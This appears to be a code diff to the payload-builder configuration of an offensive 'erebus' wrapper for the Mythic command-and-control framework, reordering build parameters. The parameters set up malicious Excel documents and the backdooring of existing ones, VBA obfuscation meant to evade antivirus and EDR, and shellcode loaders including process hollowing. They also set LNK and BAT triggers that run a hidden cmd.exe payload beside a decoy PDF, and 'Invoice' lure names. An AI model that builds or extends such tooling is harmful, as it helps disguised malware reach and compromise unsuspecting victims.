@@ -292,29 +292,17 @@ appdomain (self)""",
                 HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
             ]
         ),
-
+        
         BuildParameter(
-            name = "0.8 Trigger Binary",
-            parameter_type = BuildParameterType.String,
-            description = "Choose a command to run when the trigger is executed.",
-            default_value = "C:\\Windows\\System32\\conhost.exe",
-            hide_conditions = [
-                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
-            ]
+            name="0.8 Output Extension Source",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
+            choices=["Trigger", "MalDoc"],
+            default_value="Trigger",
         ),
 
         BuildParameter(
-            name = "0.9 Trigger Command",
-            parameter_type = BuildParameterType.String,
-            description = "Choose a command to run when the trigger is executed.",
-            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
-            hide_conditions = [
-                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
-            ]
-        ),
-
-        BuildParameter(
-            name="0.10 Trigger Type",
+            name="0.9 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
             choices=["LNK", "BAT", "MSI", "ClickOnce"],
@@ -322,11 +310,140 @@ appdomain (self)""",
             required=False,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
             ]
         ),
 
         BuildParameter(
-            name = "0.11 Decoy File Inclusion",
+            name = "0.9a Trigger Binary",
+            parameter_type = BuildParameterType.String,
+            description = "Choose a command to run when the trigger is executed.",
+            default_value = "C:\\Windows\\System32\\conhost.exe",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.9b Trigger Command",
+            parameter_type = BuildParameterType.String,
+            description = "Choose a command to run when the trigger is executed.",
+            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+        
+  # MalDocs - Excel Backdooring
+        BuildParameter(
+            name="0.9 Create MalDoc",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
+            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
+            default_value="None",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9a MalDoc Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Create new Excel document or backdoor an existing one",
+            choices=["Create New", "Backdoor Existing"],
+            default_value="Create New",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9b Excel Source File",
+            parameter_type=BuildParameterType.File,
+            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9a MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9c VBA Execution Trigger",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="VBA macro execution trigger method",
+            choices=["AutoOpen", "OnClose", "OnSave"],
+            default_value="AutoOpen",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9d Excel Document Name",
+            parameter_type=BuildParameterType.String,
+            description="Name/title for the Excel document",
+            default_value="Invoice",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9e Obfuscate VBA",
+            parameter_type=BuildParameterType.Boolean,
+            description="Obfuscate VBA code to evade AV/EDR detection",
+            default_value=True,
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9f MalDoc Injection Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
+            choices=["Command Execution", "Shellcode Injection"],
+            default_value="Command Execution",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9g VBA Loader Technique",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
+            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
+            default_value="VirtualAlloc + CreateThread",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.13 Decoy File Inclusion",
             parameter_type = BuildParameterType.Boolean,
             description = "Check whether you want the decoy file in the final payload or not",
             default_value = False,
@@ -337,12 +454,12 @@ appdomain (self)""",
         ),
 
         BuildParameter(
-            name = "0.12 Decoy File",
+            name = "0.13 Decoy File",
             parameter_type = BuildParameterType.File,
             description = """Upload a decoy file (PDF/XLSX/etc.).
 If one is not uploaded then an example file will be used.""",
             hide_conditions = [
-                HideCondition(name="0.11 Decoy File Inclusion", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="0.13 Decoy File Inclusion", operand=HideConditionOperand.EQ, value=False),
             ]
         ),
 
@@ -675,106 +792,6 @@ generated if none have been entered.""",
             ]
         ),
 
-        # MalDocs - Excel Backdooring
-        BuildParameter(
-            name="7.0 Create MalDoc",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
-            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
-            default_value="None",
-            required=False,
-        ),
-
-        BuildParameter(
-            name="7.1 MalDoc Type",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Create new Excel document or backdoor an existing one",
-            choices=["Create New", "Backdoor Existing"],
-            default_value="Create New",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None")
-            ]
-        ),
-
-        BuildParameter(
-            name="7.2 Excel Source File",
-            parameter_type=BuildParameterType.File,
-            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="7.1 MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing")
-            ]
-        ),
-
-        BuildParameter(
-            name="7.3 VBA Execution Trigger",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="VBA macro execution trigger method",
-            choices=["AutoOpen", "OnClose", "OnSave"],
-            default_value="AutoOpen",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None")
-            ]
-        ),
-
-        BuildParameter(
-            name="7.4 Excel Document Name",
-            parameter_type=BuildParameterType.String,
-            description="Name/title for the Excel document",
-            default_value="Invoice",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None")
-            ]
-        ),
-
-        BuildParameter(
-            name="7.5 Obfuscate VBA",
-            parameter_type=BuildParameterType.Boolean,
-            description="Obfuscate VBA code to evade AV/EDR detection",
-            default_value=True,
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None")
-            ]
-        ),
-
-        BuildParameter(
-            name="7.6 MalDoc Injection Type",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
-            choices=["Command Execution", "Shellcode Injection"],
-            default_value="Command Execution",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None")
-            ]
-        ),
-
-        BuildParameter(
-            name="7.7 VBA Loader Technique",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
-            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
-            default_value="VirtualAlloc + CreateThread",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="7.6 MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution")
-            ]
-        ),
-
-
-        BuildParameter(
-            name="9.0 Output Extension Source",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
-            choices=["Trigger", "MalDoc"],
-            default_value="Trigger",
-        ),
 ]
 
     build_steps = [
@@ -978,15 +995,15 @@ generated if none have been entered.""",
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
 
 
-        ext_source = self.get_parameter("9.0 Output Extension Source")
+        ext_source = self.get_parameter("0.8 Output Extension Source")
         if ext_source == "MalDoc":
-            maldoc_mode = self.get_parameter("7.0 Create MalDoc")
+            maldoc_mode = self.get_parameter("0.9 Create MalDoc")
             if maldoc_mode == "VBA Module Only":
                 target_ext = ".bas"
             else:
                 target_ext = ".xlsm"
         else:
-            target_ext = f".{self.get_parameter('0.10 Trigger Type').lower()}"
+            target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"
 
 
         match(self.get_parameter("3.0 Container Type")):
@@ -1858,9 +1875,9 @@ generated if none have been entered.""",
                     return response
 
             ######################### Creating Decoy Section #########################
-            if self.get_parameter("0.11 Decoy File Inclusion"):
+            if self.get_parameter("0.13 Decoy File Inclusion"):
                 decoy_dir = Path(agent_build_path) / "decoys"
-                decoy_file_uuid = self.get_parameter("0.12 Decoy File")
+                decoy_file_uuid = self.get_parameter("0.13 Decoy File")
 
                 if decoy_file_uuid:
                     try:
@@ -1907,9 +1924,9 @@ generated if none have been entered.""",
                         ))
             ######################### End of Decoy Section #########################
             ######################### MalDoc Creation Section #########################
-            maldoc_mode = self.get_parameter("7.0 Create MalDoc")
+            maldoc_mode = self.get_parameter("0.9 Create MalDoc")
 
-            if maldoc_mode != "None" and self.get_parameter("9.0 Output Extension Source") == "Trigger":
+            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
@@ -1918,20 +1935,20 @@ generated if none have been entered.""",
                         StepSuccess=True
                     ))
 
-            if maldoc_mode != "None" and self.get_parameter("9.0 Output Extension Source") != "Trigger":
+            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                 payload_dir = Path(agent_build_path) / "payload"
-                maldoc_type = self.get_parameter("7.1 MalDoc Type")
-                vba_trigger = self.get_parameter("7.3 VBA Execution Trigger")
-                doc_name = self.get_parameter("7.4 Excel Document Name")
-                obfuscate = self.get_parameter("7.5 Obfuscate VBA")
-                injection_type = self.get_parameter("7.6 MalDoc Injection Type")
+                maldoc_type = self.get_parameter("0.9a MalDoc Type")
+                vba_trigger = self.get_parameter("0.9c VBA Execution Trigger")
+                doc_name = self.get_parameter("0.9d Excel Document Name")
+                obfuscate = self.get_parameter("0.9e Obfuscate VBA")
+                injection_type = self.get_parameter("0.9f MalDoc Injection Type")
 
                 try:
                     # Generate VBA payload code based on injection type
                     if injection_type == "Command Execution":
                         # Use WScript.Shell to execute trigger binary and command
-                        trigger_binary = self.get_parameter("0.8 Trigger Binary")
-                        trigger_command = self.get_parameter("0.9 Trigger Command")
+                        trigger_binary = self.get_parameter("0.9a Trigger Binary")
+                        trigger_command = self.get_parameter("0.9b Trigger Command")
 
                         # Import the plugin function to generate command execution VBA
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
@@ -2012,7 +2029,7 @@ generated if none have been entered.""",
                             "QueueUserAPC Injection": "queueuserapc",
                             "Process Hollowing": "hollowing"
                         }
-                        loader_type = loader_map.get(self.get_parameter("7.7 VBA Loader Technique"), "createthread")
+                        loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
                         output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
 
                         # Get target process for hollowing technique
@@ -2076,7 +2093,7 @@ generated if none have been entered.""",
 
                     else:  # Backdoor Existing
                         # Get the uploaded Excel file
-                        excel_uuid = self.get_parameter("7.2 Excel Source File")
+                        excel_uuid = self.get_parameter("0.9b Excel Source File")
                         if not excel_uuid:
                             raise ValueError("No Excel file provided for backdooring")
 
@@ -2138,7 +2155,7 @@ generated if none have been entered.""",
             ######################### End of MalDoc Section #########################
             ######################### Trigger Generation Section #########################
 
-            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("9.0 Output Extension Source") == "MalDoc":
+            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") == "MalDoc":
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
@@ -2147,13 +2164,13 @@ generated if none have been entered.""",
                     StepSuccess=True,
                 ))
 
-            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("9.0 Output Extension Source") != "MalDoc":
+            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") != "MalDoc":
 
                 payload_dir = Path(agent_build_path) / "payload"
                 decoy_dir = Path(agent_build_path) / "decoys"
                 decoy_file = decoy_dir / "decoy.pdf"
 
-                trigger_type = self.get_parameter("0.10 Trigger Type")
+                trigger_type = self.get_parameter("0.9 Trigger Type")
 
                 try:
                     trigger_path = ""
@@ -2161,8 +2178,8 @@ generated if none have been entered.""",
                     match trigger_type:
                         case "LNK":
                             trigger_path = create_payload_trigger(
-                                target_bin=str(self.get_parameter("0.8 Trigger Binary")),
-                                args=str(self.get_parameter("0.9 Trigger Command")),
+                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
+                                args=str(self.get_parameter("0.9b Trigger Command")),
                                 icon_src=r"C:\\Windows\\System32\\imageres.dll",
                                 icon_index=0,
                                 description="Invoice",
@@ -2172,8 +2189,8 @@ generated if none have been entered.""",
 
                         case "BAT":
                             trigger_path = create_bat_payload_trigger(
-                                target_bin=str(self.get_parameter("0.8 Trigger Binary")),
-                                args=str(self.get_parameter("0.9 Trigger Command")),
+                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
+                                args=str(self.get_parameter("0.9b Trigger Command")),
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file
                             )
